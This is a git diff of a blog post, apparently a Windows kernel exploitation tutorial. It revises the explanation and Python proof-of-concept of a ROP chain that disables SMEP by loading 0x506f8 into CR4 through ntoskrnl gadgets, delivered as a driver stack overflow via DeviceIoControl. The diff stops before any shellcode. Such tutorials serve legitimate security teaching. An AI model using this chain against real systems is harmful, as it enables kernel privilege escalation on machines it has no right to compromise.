@@ -285,13 +285,13 @@ As you can see, this ROP gadget is "located" at 0x140108552. However, since this
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/64_21_a.png" alt="">
 
-Awesome! So now we have a way to move the contents of the ECX register into the CR4 register. How can we control the contents of the ECX register that allow us to get our desired result? Recall the property of ROP from my previous post. Whenever we had a nice ROP gadget that allowed a desired intruction, but there was an unecessary `pop` in the gadget, we used filler data of NOPs. This is because we are just simply placing data in a register- we are not executing it.
+Awesome! rp++ was a bit wrong in its enumeration. rp++ says that we can put ECX into the CR4 register. Howerver, upon further inspection, we can see this ROP gadget ACTUALLY points to a `mov cr4, rcx` instruction. This is perfect for our use case! We have a way to move the contents of the RCX register into the CR4 register. You may be asking "Okay, we can control the CR4 register via the RCX registger- but how does this help us"?. Recall the property of ROP from my previous post. Whenever we had a nice ROP gadget that allowed a desired intruction, but there was an unecessary `pop` in the gadget, we used filler data of NOPs. This is because we are just simply placing data in a register- we are not executing it.
 
 The same principle applies here. If we can `pop` our intended flag value into ECX, we should have no problem. Here is the issue though. In `ntoskrnl.exe`, there is no direct `pop ecx, ret` ROP gadget. Instead, we will POP our value into RCX. RCX will contain a value of 0x506f8 (our intended CR4 register value). RCX has the ability to hold a piece of data that is 8 bytes long (0xffffffffffffffff). So, if we executed a `pop rcx` with our intended CR4 register value, RCX would contain 0x00000000000506f8.
 
-You may be asking "Okay we can control RCX- but our ROP gadget moves ECX into CR4- not RCX."
+Real quick with brevity- let's say rp++ was right, in that we could only control the contents of the ECX register (instead of RCX). How would this affect us?
 
-Great point. Recall, however, how the registers work here.
+Recall, however, how the registers work here.
 
 ```
 -----------------------------------
@@ -307,11 +307,13 @@ Great point. Recall, however, how the registers work here.
 
 This means, even though RCX contains 0x00000000000506f8, a `mov cr4, ecx` would take the lower 32-bits of RCX (which is ECX) and place it into the CR4 register. This would mean ECX would equal 0x000506f8- and that value would end up in CR4. So even though we are using both RCX and ECX, due to lack of `pop rcx` ROP gadgets, we will be unaffected!
 
+Now, let's continue on to controlling the RCX register.
+
 So let's find a `pop rcx` value!
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/64_22.png" alt="">
 
-Nice! We have a ROP gadget located at ntoskrnl.exe + 0x3544. Let's update our POC. This POC takes care of the semantics such as finding the offset to the `ret` instruction we are overwriting, etc.
+Nice! We have a ROP gadget located at ntoskrnl.exe + 0x3544. Let's update our POC with some breakpoints where our user mode shellcode will reside, top verify we can hit our shellcode. This POC takes care of the semantics such as finding the offset to the `ret` instruction we are overwriting, etc.
 
 ```python
 import struct
@@ -379,10 +381,10 @@ input_buffer = ("\x41" * 2056)
 
 # SMEP says goodbye
 print "[+] Starting ROP chain. Goodbye SMEP..."
-input_buffer += struct.pack('<Q', kernel_address + 0x3544)      # pop ecx; ret
+input_buffer += struct.pack('<Q', kernel_address + 0x3544)      # pop rcx; ret
 
 print "[+] Flipped SMEP bit to 0 in RCX..."
-input_buffer += struct.pack('<Q', 0x00000000000506f8)           # Intended CR4 value
+input_buffer += struct.pack('<Q', 0x506f8)           		# Intended CR4 value
 
 print "[+] Placed disabled SMEP value in CR4..."
 input_buffer += struct.pack('<Q', kernel_address + 0x108552)    # mov cr4, rcx ; ret
@@ -420,4 +422,13 @@ kernel32.DeviceIoControl(
     byref(c_ulong()),                   # lpBytesReturned
     None                                # lpOverlapped
 )
+```
+
+Nice! As you can see, we hit the breakpoints, which represent our shellcode!
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/64_23.png" alt="">
+
+This means we have succesfully disabled SMEP, and we can execute usermode shellcode! Let's finalize this exploit with a working POC. Let's update our script with weaponized shellcode!
+
+```python
 ```
